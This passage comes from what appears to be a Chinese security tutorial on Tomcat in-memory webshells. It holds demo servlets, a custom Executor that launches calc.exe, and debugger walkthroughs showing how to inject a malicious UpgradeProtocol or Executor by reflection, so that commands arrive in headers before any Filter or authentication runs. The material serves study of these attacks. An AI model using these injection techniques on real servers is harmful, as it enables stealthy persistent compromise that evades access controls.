import org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler;
import org.apache.tomcat.util.net.SocketWrapperBase;
import java.lang.reflect.Field;
import java.nio.ByteBuffer;

@WebServlet("/evil")
public class TestUpgrade extends HttpServlet {

    static class MyUpgrade implements UpgradeProtocol {
        @Override
        public String getHttpUpgradeName(boolean b) {
            return null;
        }

        @Override
        public byte[] getAlpnIdentifier() {
            return new byte[0];
        }

        @Override
        public String getAlpnName() {
            return null;
        }

        @Override
        public Processor getProcessor(SocketWrapperBase<?> socketWrapperBase, Adapter adapter) {
            return null;
        }

        @Override
        public InternalHttpUpgradeHandler getInternalUpgradeHandler(SocketWrapperBase<?> socketWrapperBase, Adapter adapter, org.apache.coyote.Request request) {
            return null;
        }

        @Override
        public boolean accept(org.apache.coyote.Request request) {
            try {
                Field response = org.apache.coyote.Request.class.getDeclaredField("response");
                response.setAccessible(true);
                Response resp = (Response) response.get(request);
                resp.doWrite(ByteBuffer.wrap("Hello, this my test Upgrade!".getBytes()));
            } catch (Exception ignored) {}
            return false;
        }
    }
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
        try {
            RequestFacade rf = (RequestFacade) req;
            Field requestField = RequestFacade.class.getDeclaredField("request");
            requestField.setAccessible(true);
            Request request1 = (Request) requestField.get(rf);
            new MyUpgrade().accept(request1.getCoyoteRequest());
        } catch (Exception ignored) {}
    }
}


```

效果如下：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGXlMnkzBM2XlAVHLgTZXoVMUricbThm14ZRPVgPFSI2yZRg9CclU2yuA/640?wx_fmt=png&from=appmsg)

### 2.14.2 Tomcat Upgrade 内存马介绍与相关代码调试分析

这部分主要参考了`Sndav`师傅的文章（原文地址为`https://tttang.com/archive/1709/`，但是由于图片链接挂掉导致图片无法显示，我们可以访问如下地址查看：`https://web.archive.org/web/20220823040415/https://tttang.com/archive/1709/`）以及`p4d0rn`师傅的文章（`https://p4d0rn.gitbook.io/java/memory-shell/tomcat-middlewares/upgrade`）。

和之前所提到的`Spring Interceptor`型内存马有点类似，在渗透过程中，尽管我们打入了内存马，但是因为原有的 Filter 包含鉴权或者其他功能，可能会导致我们的内存马无法访问，或者因为反向代理而导致我们无法找到对应的路径，这就需要我们在到`Filter`这一步之前就得打入内存马。

这里，我引用码哥字节文章（`https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09`）里面的一张`Tomcat`架构图：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGQ5XjFoicHYTeHU7nXKRMvBvicHM8B2XzZqYZM8qCnsx1icrRP8LhXBYeQ/640?wx_fmt=png&from=appmsg)

可以清楚地看到，在此之前还有`Executor`和`Processor`两个模块，本节内容主要讨论后者，在下节中我们会讨论前者。

这一部分需要更加完备的`Tomcat`的相关知识，不再满足于之前的四个容器，关于这些基础知识的学习，强烈建议看码哥字节的文章，写的确实特别的好：

> https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09

其实在之前学习`Tomcat Valve`的过程中，当时我是一步步`step over`跟完了所有的代码的，我当时也提了一嘴`Http11Processor`。我们还是以当时的项目为例来看。

我们还是在`StandardHostValve.java`的这行打上断点：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGt3TZ33vSyj7fJicnag5oUhauVncY6ElKICEt2eB4sMQzegeU7JVZXDA/640?wx_fmt=png&from=appmsg)

从上面我红色箭头所指出的地方就可以看到调用到了`process`函数，具体调用位置位于`org.apache.coyote.AbstractProcessorLight#process`，我们跟过去看看：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGnBeC9tTVKcUh6Ry6aKfBOVvafL38l3ao4UW6Fu5F0dYMttQC72DwEQ/640?wx_fmt=png&from=appmsg)

可以看到，如果当前`SocketWrapperBase`的状态是`OPEN_READ`的时候，才会调用对应的`processor`去处理（第二张图的`process`调用的位置可以通过第一张图左下角的那个`process`的后一个`process`点进去看到）：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGWUuXImazmJYR6ZVia3iaiaicVs0Ef6ibaGmJ0nsll7RavVKVV90pAaxBPPg/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGjIAh4ialZh4o81dMiaDX8oClMHicmyCYWIrlSOO7ckhv6dtrq8ZRNT3CA/640?wx_fmt=png&from=appmsg)

我们继续`step into`这里的`service`方法看看：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGxiayB3NFVBFZtUmibGiawBe2QfHkic5vJg3cRQJylicxRFBnLvTfhgLj6ug/640?wx_fmt=png&from=appmsg)

继续`step over`，可以看到这里在检查`header`中的`Connection`头中是否为`upgrade`，这一点可以通过`step into`这个`isConnectionToken`方法看到：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGZMhreftBPR6ufPE1d5bcUdXpHKbaPXD2Qks8Fr6hJIf225rSS2m9Ig/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGHbNvQfPW9CsecbhPMrtQmWgjCOLjs4JFMAt1Drg0LLktNref4UGwRg/640?wx_fmt=png&from=appmsg)

之后干两件事情：一是调用`getUpgradeProtocol`方法根据`upgradedName`从`httpUpgradeProtocols`拿到`UpgradeProtocol`；二是调用`UpgradeProtocol`对象的`accept`方法：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGfRLqmm5a5ibLb0ltPY2Qn3Ave9Uq20ZPkuzL3w3LMheJxNvZFCOIiaicA/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGpqDRibU21gDb8oXdfRKQU97NnVT1uQR4muec56icVOFBJm1QcOyY4RuQ/640?wx_fmt=png&from=appmsg)

到了这里，我们似乎可以建立起一个猜想，和之前介绍的内存马类似，我们只要构造一个恶意的`UpgradeProtocol`，然后把它插入到`httpUpgradeProtocols`。

由于`httpUpgradeProtocols`是一个`hashmap`，那么向里面添加的话用到的肯定是`put`方法，直接搜`httpUpgradeProtocols.put`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGwsAjAdQcHOg4Em4X8pUTImRdDNLDJfnXOEqnic1C2UxUpxdhiaO93uicg/640?wx_fmt=png&from=appmsg)

我们在这行打上断点，然后调试，发现在我们没有执行`curl -H "Connection: Upgrade" -H "Upgrade: hello" http://localhost:8080`这条命令之前，断点就到了，也就是说，`httpUpgradeProtocols.put`这个事情是发生在`tomcat`启动的时候的。

那这样一来，思路就更加具体了一点：反射找到`httpUpgradeProtocols`，把恶意`upgradeProtocol`插入进去即可构成`upgrade`内存马，思路和之前是一模一样的。

那现在只需要解决最后一个问题——如何找到`httpUpgradeProtocols`的位置。我们打开之前用`tomcat`搭建的`Tomcat Upgrade`的`demo`，在如下位置打下断点，然后执行命令`curl -H "Connection: Upgrade" -H "Upgrade: hello" http://localhost:8080/evil`进入断点调试：：![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGcickGSXN5DLwDPVSjVCRJ56DoTYfTMJflY0JfXlwZrlz4mvSXQ0RmEg/640?wx_fmt=png&from=appmsg)

`step over`一步即可在下方看到`request1`属性：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAG8M5cfuskjydRLUuMlmaLtjdBjCjhQw6mzmV55ibaUGPMquBfmFpheDQ/640?wx_fmt=png&from=appmsg)

然后在`request1`里面的`connector`的`protocolHandler`里面发现了`httpUpgradeProtocols`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGs0eu5zicIgBHpv4VOxF3YqXl5PicXxo8KzpalVlzf3lYSroRMS9IH4zQ/640?wx_fmt=png&from=appmsg)

接下来就是一步步地反射了。

2.15 Tomcat Executor 内存马介绍与打入内存马思路分析
------------------------------------

### 2.15.1

新建一个项目，配置好`tomcat`运行环境和`web`目录，然后新建以下两个文件，第一个是 TestExecutor.java：

```
package org.example;

import java.io.IOException;
import java.util.concurrent.SynchronousQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

public class TestExecutor extends ThreadPoolExecutor {

    public TestExecutor() {
        super(0, Integer.MAX_VALUE, 60L, TimeUnit.SECONDS, new SynchronousQueue<>());
    }

    @Override
    public void execute(Runnable command) {
        try {
            Runtime.getRuntime().exec("calc.exe");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        super.execute(command);
    }
}


```

第二个是`TestServlet.java`：

```
package org.example;

import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet("/test")
public class TestServlet extends HttpServlet {
    TestExecutor executor = new TestExecutor();

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
        executor.execute(() -> {
            System.out.println("Execute method triggered by accessing /test");
        });
    }
}


```

然后访问浏览器对应`context`下的`test`路由：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAG4DPQkX4ZXltPBfa6Enia8vyzqy69xgnsuqz0KQNvNdUzaKKymH3N9cw/640?wx_fmt=png&from=appmsg)

### 2.15.2 Tomcat Executor 内存马介绍与代码调试分析

在`2.14.2`节中，我们聊到过可以在`Executor`模块中打入内存马，本节就来分析具体流程。本节主要参考文章为以下四篇：

> https://p4d0rn.gitbook.io/java/memory-shell/tomcat-middlewares/executor
> 
> https://cjlusec.ldxk.edu.cn/2023/02/15/Executor/
> 
> https://xz.aliyun.com/t/11593
> 
> https://xz.aliyun.com/t/11613

在我之前提到过的讲 tomcat 架构的基础文章（`https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09`），有详细地讲述`ProtocolHandler`组件中的`EndPoint`部件，如果之前没有看完整地可以再去看下。里面这张图画的很好，我这里作引用：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGrpxAZao54zpj6F7XBibdftPiaHoMjQ621IvNk8HvvQ7C9DtibwaAeE53g/640?wx_fmt=jpeg&from=appmsg)

#### 2.15.2.1 Endpoint 五大组件

如下表所示：

<table><thead><tr><th>组件</th><th>描述</th></tr></thead><tbody><tr><td><code>LimitLatch</code></td><td>连接控制器，控制最大连接数</td></tr><tr><td><code>Acceptor</code></td><td>接收新连接并返回给<code>Poller</code>的<code>Channel</code>对象</td></tr><tr><td><code>Poller</code></td><td>监控<code>Channel</code>状态，类似于<code>NIO</code>中的<code>Selector</code></td></tr><tr><td><code>SocketProcessor</code></td><td>封装的任务类，处理连接的具体操作</td></tr><tr><td><code>Executor</code></td><td><code>Tomcat</code>自定义线程池，用于执行任务类</td></tr></tbody></table>

#### 2.15.2.2 Endpoint 分类

`EndPoint`接口的具体实现类为`AbstractEndpoint`，`AbstractEndpoint`具体的实现类有`AprEndpoint`、`Nio2Endpoint`、`NioEndpoint`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGMO80hekQFTyGFyV71XZ8gDoyAYVicGcAWFyibYyDRFUIe7RGVic8vvLnw/640?wx_fmt=png&from=appmsg)

<table><thead><tr><th>Endpoint</th><th>简要解释</th><th>Tomcat 源码位置</th></tr></thead><tbody><tr><td><code>AprEndpoint</code></td><td>使用<code>APR</code>模式解决异步<code>IO</code>问题，提高性能</td><td><code>org.apache.tomcat.util.net.AprEndpoint</code></td></tr><tr><td><code>Nio2Endpoint</code></td><td>使用代码实现异步<code>IO</code></td><td><code>org.apache.tomcat.util.net.Nio2Endpoint</code></td></tr><tr><td><code>NioEndpoint</code></td><td>使用<code>Java NIO</code>实现非阻塞<code>IO</code></td><td><code>org.apache.tomcat.util.net.NioEndpoint</code></td></tr></tbody></table>

上面所提到的`tomcat`，指的是如下`pom`依赖：

```
<dependency>
    <groupId>org.apache.tomcat</groupId>
    <artifactId>tomcat-coyote</artifactId>
    <version>9.0.83</version>
</dependency>


```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGD0xAfibPTHoaocOgbkZAn0fdkL4gesCNYBMU0uN6reesDjkiaeYSZsPg/640?wx_fmt=png&from=appmsg)

`Tomcat`默认启动是以`NioEndpoint`来启动的，它是`Tomcat`中默认的负责使用`NIO`方式进行网络通信功能的模块，它负责监听处理请求连接，并将解析出的字节流传递给`Processor`进行后续的处理。

#### 2.15.2.3 Executor 相关代码分析

点开`Executor.java`即可看到有一个`execute`方法：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGtm4LlMBdqRyEk6hUKao9snb6iaT4Qwlv8kcRXQEArqpzwXrhRvrmtBw/640?wx_fmt=png&from=appmsg)`Ctrl+Alt+F7`追踪即可看到这个`Executor`接口在`AbstractEndpoint`这个抽象类中有相关实现：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAG8HkRw6vHDuPDsPWfdYp3kX8urbYNCPvEaaQQOyucTGLPRlAqOU6oSQ/640?wx_fmt=png&from=appmsg)

在`AbstractEndpoint.java`中搜索`executor`，往下翻即可看到有`setExecutor`和`getExecutor`这两个函数：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGkx7Zj2icAchpAJhIRQ9OY9oXyTEdQtcLwic22yGFYKQQIpH4vc08okRg/640?wx_fmt=png&from=appmsg)

查看`getExecutor`函数的调用位置，发现就在该文件中有一个关键调用：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGkD1mf6ZibtYbO63LlPcBeWQUtrAU38IQrDia2nvQ7arOP1NSFbZY3kyw/640?wx_fmt=png&from=appmsg)

跟过去：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGWoQfmiaLg9eOuTuibaCqPia1ouQuEXrlr9ngaicC7lY1icreZhoroJfTKfw/640?wx_fmt=png&from=appmsg)

从下面这篇文章中我们可以知道`processSocket`在`Tomcat`运行过程中的作用：

> https://blog.51cto.com/u_8958931/2817418

那此时我们就有一个想法，如果我能控制`executor`，我把原来的`executor`通过`setExecutor`变成我恶意创建的`executor`，然后再通过这后面的`executor.execute`（`org.apache.tomcat.util.threads.ThreadPoolExecutor#execute(java.lang.Runnable)`）一执行就可以加载我们的恶意逻辑了。

但是现在有一个很头疼的问题，那就是标准的`ServletRequest`需要经过`Adapter`的封装后才可获得，这里还在`Endpoint`阶段，其后面封装的`ServletRequest`和`ServletResponse`无法直接获取。

那怎么办呢？结合之前学过的知识，我们很容易想到在之前我们第一次接触`java-object-researcher`的时候，`c0ny1`师傅写的这篇文章：

> ![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGGI7zbgWGqSbowCsc3jObhDgL6b0rzEOphf9ZiaocB4PDBr66Sy9yGAA/640?wx_fmt=png&from=appmsg)
> 
> http://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/
> 
> ![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGnLYDsuiaEEZaOe9ZnesjomjDyDfaUmdkymvW15VegBNvQG8mJqx0tHQ/640?wx_fmt=png&from=appmsg)

那就试试看呗，我们导入`jar`包到项目之后修改`TestServlet.java`代码如下：

```
package org.example;

import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import me.gv7.tools.josearcher.entity.Blacklist;
import me.gv7.tools.josearcher.entity.Keyword;
import me.gv7.tools.josearcher.searcher.SearchRequstByBFS;
import java.util.ArrayList;
import java.util.List;

@WebServlet("/test")
public class TestServlet extends HttpServlet {
    TestExecutor executor = new TestExecutor();

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
        executor.execute(() -> {
            System.out.println("Execute method triggered by accessing /test");
        });
        List<Keyword> keys = new ArrayList<>();
        keys.add(new Keyword.Builder().setField_type("request").build());
        List<Blacklist> blacklists = new ArrayList<>();
        blacklists.add(new Blacklist.Builder().setField_type("java.io.File").build());
        SearchRequstByBFS searcher = new SearchRequstByBFS(Thread.currentThread(),keys);
        searcher.setBlacklists(blacklists);
        searcher.setIs_debug(true);
        searcher.setMax_search_depth(10);
        searcher.setReport_save_path("D:\\javaSecEnv\\apache-tomcat-9.0.85\\bin");
        searcher.searchObject();
    }
}


```

接着访问路由，然后在控制台输出中搜索`request =` ：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGmYX45l0NUkcLQvgHeib3EHuauDbfug0RMZtcHchJj2N9hGEvqk5iaicCw/640?wx_fmt=png&from=appmsg)

直接搜索到了这条链：

```
TargetObject = {org.apache.tomcat.util.threads.TaskThread} 
  ---> group = {java.lang.ThreadGroup} 
   ---> threads = {class [Ljava.lang.Thread;} 
    ---> [15] = {java.lang.Thread} 
     ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller} 
      ---> this$0 = {org.apache.tomcat.util.net.NioEndpoint} 
       ---> connections = {java.util.Map<U, org.apache.tomcat.util.net.SocketWrapperBase<S>>} 
        ---> [java.nio.channels.SocketChannel[connected local=/0:0:0:0:0:0:0:1:8080 remote=/0:0:0:0:0:0:0:1:10770]] = {org.apache.tomcat.util.net.NioEndpoint$NioSocketWrapper} 
         ---> socket = {org.apache.tomcat.util.net.NioChannel} 
          ---> appReadBufHandler = {org.apache.coyote.http11.Http11InputBuffer} 
            ---> request = {org.apache.coyote.Request}


```

我们来验证一下，在`org/apache/tomcat/util/net/NioEndpoint.java`的这里下断点，不断`step over`，就可以找到这里的`request`的位置：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGTsdbWd3icjl9pBKNoiaFg24MFoUicaKoic6ygR3jO5RsvDcdubzJGEUp9A/640?wx_fmt=png&from=appmsg)

点开这里的`byteBuffer`，可以看到它是一个字节数组，右键找到`View as ... String`即可变成字符串：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGt4pqmPdfEzugIlYbbRjopPMQHicOTt21xEHgict0U2XxqlbnSU6V3sFQ/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGP6omYVayiahR3qGsia64YqUD7ibYIRaIv7azGa2a0EQyMf54SDicCqUtcQ/640?wx_fmt=png&from=appmsg)

再点击上面我指出来的`View Text`即可清楚看到具体内容：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGs4Lxn8YyCGuuMqqpzO7wzDHQ686m03JIGPMnybFf9w3TufUNEnuibsw/640?wx_fmt=png&from=appmsg)

这就意味着我们可以把命令作为`header`的一部分传入，再把结果作为`header`的一部分传出即可。